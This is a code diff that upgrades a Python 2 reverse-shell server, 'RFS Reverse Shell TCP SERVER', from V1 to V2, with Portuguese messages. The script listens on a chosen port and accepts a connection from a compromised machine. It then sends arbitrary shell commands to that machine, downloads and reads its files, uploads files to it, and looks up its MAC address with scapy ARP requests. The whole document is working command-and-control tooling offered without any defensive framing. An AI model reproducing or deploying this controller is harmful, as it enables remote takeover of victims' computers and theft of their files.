@@ -1,8 +1,13 @@
-# -*- coding: cp1252 -*-
 import socket,os,sys,threading
+from scapy.all import *
+def banner():
+   print('#######################################################################################################\n\n')
+   print('RFS Reverse Shell TCP SERVER V2')
+   print('#######################################################################################################\n')
+   
 def download(conn,command):
-    arq = "server_file.py"
-    f = open(arq,'wb')
+    conn.send(command)
+    f = open('server_file.py','wb')
     while True:  
         bits = conn.recv(1024)
         if 'Unable to find out the file' in bits:
@@ -13,74 +18,92 @@ def download(conn,command):
             f.close()
             break
         f.write(bits)
-# Old Shell for command execution
 
-
+def Cat(conn,command):
+    conn.send(command)
+    while True:
+        bits = conn.recv(1024)
+        if 'Unable to find out the file' in bits:
+            break
+        if bits.endswith('DONE'):
+            break
+        print(bits)
+       
 def mandaArq(s,path):
- try:    
-    caminho = str(os.getcwd())+'\\'+path
-    s.send('mandaArq %s'%path)
+ try:
+    pat = path[7:]
+    caminho = str(os.getcwd())+'//'+pat
     if os.path.exists(caminho):
-        print('Enviando arquivo %s ...'%path)
+        print('Enviando arquivo %s ...'%pat)
+        s.send('upload %s'%pat)
         f = open(caminho, 'rb')
         packet = f.read(1024)
         while packet != '':
-            s.send(packet) 
+            s.send(packet)
             packet = f.read(1024)
         s.send('DONE')
-        f.close()     
+        f.close()
+        print(s.recv(1024))  
+ except Exception as e:
+     print('[-] Arquivo %s nao encontrado, erro:\n %s '%(pat,e))
 
- except:
-     print('[-] Arquivo %s não encontrado '%path)
-     
-def banner():
-   print('#######################################################################################################\n\n')
-   print('RFS Reverse Shell TCP SERVER V1')
-   print('#######################################################################################################\n\n')
+
+def get_mac(ip_address):
+    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
+    for s,r in responses:
+        return r[Ether].src
+    return None
+
 
 def connect():
-    ip = ''
-    port = 4222
     try:
+     ip = ''
+     port = int(raw_input('[+]PORT: '))
      s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.bind((ip,port))
-     s.listen(5)
-     print('Listening at port: '+str(port))
+     s.listen(1)
+     print('[+]127.0.0.1 Listening at port: '+str(port))
      conn,addr = s.accept()
-     print('[+] User connected : ',addr)
+     print('[+]Connected %s at port %s '%(addr[0],addr[1]))
 
      while True:
-        command = str(raw_input("CMD# >"))
-        if 'quit' in command:
-            conn.send('quit')
-            conn.close()
-            break
+        command = str(raw_input("CMD# > ")).rstrip()
         
-        elif 'download' in command:
-            conn.send(command)
-            resposta = conn.recv(1024)
-            download(conn,command )
+        if 'quit' in command:
+           print('[-]Conexao encerrada ... ')
+           conn.send('quit')
+           conn.close()
+           break
 
-        elif 'mandaArq' in command:
-            mand = command[9:]
-            mandaArq(conn,mand)
-            print(conn.recv(1024))
-            
+        elif 'download' in command:
+           download(conn,command)
+
+        elif 'cat' in command:
+           Cat(conn,command)
+           
+        elif 'getMac' in command:
+           mac = get_mac(addr[0])
+           print('[+]Endereco MAC do ip %s => %s'%(addr[0],mac))
+
+        elif 'upload' in command:
+           mandaArq(conn,command)
+           
         else:
-            conn.send(command)
-            resposta = conn.recv(4096)
-            if 'quit' in resposta:
-                conn.close()
-                break
-            print(resposta)
-    except:
-        e = sys.exc_info()[0]
-        print('[server]Erro ao se conectar \n [-]Erro S3RV3R : \n %s'%str(e))
+           conn.send(command)
+           resposta = conn.recv(4096)
+           print(resposta)
+           
+    except Exception as e:
+        print('[Server]Erro ao se conectar... \n [-]Erro: %s'%str(e))
 
 def main():  
     client_handler = threading.Thread(target=connect,args=())
     client_handler.start()
-    
-banner()
-main()
+
+try:
+    banner()
+    main()
+except:
+    print('[-]Erro ao abrir o server')
+    main()
     
